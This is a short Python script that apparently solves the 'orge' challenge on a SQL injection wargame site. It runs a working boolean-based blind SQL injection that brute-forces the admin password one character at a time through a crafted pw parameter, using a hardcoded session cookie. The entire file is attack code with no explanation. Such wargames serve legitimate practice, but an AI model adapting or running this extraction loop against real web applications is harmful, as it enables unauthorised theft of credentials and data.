import requests


host = "https://los.rubiya.kr"
password=""
cookies = {"PHPSESSID": "7nn6qu3gqi6heere5euhieu8nb"}
for i in range(1,9):
    for j in range(33,126):
        pw_payload="?pw=1'|| id='admin' %26%26 ascii(substr(pw,"+str(i)+",1))="+str(j)+"-- "

        r = requests.get(host+"/chall/orge_bad2f25db233a7542be75844e314e9f3.php" + pw_payload, cookies=cookies)

        if (r.text.find('Hello admin')>0):
            password+=chr(j)
            print(password)
            break

print(password)
